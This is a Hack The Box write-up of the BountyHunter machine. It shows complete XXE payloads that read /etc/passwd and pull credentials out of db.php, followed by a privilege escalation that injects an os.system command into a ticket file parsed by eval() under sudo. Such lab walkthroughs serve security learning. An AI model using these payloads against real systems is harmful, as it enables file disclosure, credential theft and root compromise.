# HTB - BountyHunter
Dominik Zarsky, 2021-11-09

# Enumeration

## Nmap
Open ports 80, 22

## GObuster
Enumerated PHP, JS and SQL files

Found
- db.php

# Website
- Found form at http://10.10.11.100/log_submit.php, determined it sends base64 encoded XML to http://10.10.11.100/tracker_diRbPr00f314.php through POST request
- Decoded XML and attempted XXE
- Captured request with Burp, altered its contents with base64 encoded and then urlencoded payloads listed below

## Payload

### Enumerating users

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE title [
    <!ELEMENT title ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>asdsad</cwe>
		<cvss>asdasd</cvss>
		<reward>asd</reward>
		</bugreport>
```

### Getting credentials

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE title [
    <!ELEMENT title ANY >
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php" >]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>asdsad</cwe>
		<cvss>asdasd</cvss>
		<reward>asd</reward>
		</bugreport>
```

- Yielded base64 encoded contants of *db.php*

# System

## User
- Connected with SSH with username from `/etc/passwd` and password from `db.php` and got the flag

```bash
ssh development@10.10.11.100
cat user.txt
```

## Enumeration
- Ran `sudo -l`, found the user to have permissions to run `/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py` as sudo without password

### Python script
Found the following portion of the script interesting:

```python
def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False
```

- The eval statement caught my eye as I thought it could be used to run a command
- That was indeed the case as something like `eval("**32+22 and print('hello')**".replace("**", ""))` can be done, the main thing was to change the leading number in such a way it would satisfy the modulo condition

## Root
- There were several pre-formatted *tickets* in `/opt/skytrain_inc/invalid_tickets`, which were used as a blueprint

```bash
cat /opt/skytrain_inc/invalid_tickets/734485704.md > /home/development/xxx.md
```

- In `xxx.md`

```md
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**32+100 and __import__('os').system('cat /root/root.txt')**
##Issued: 2021/04/06
#End Ticket
```

- Root flag was diplayed in the terminal
- I also tried to spawn a reverse shell with netcat and bash (TCP) but to no avail, so I catted the root flag directly
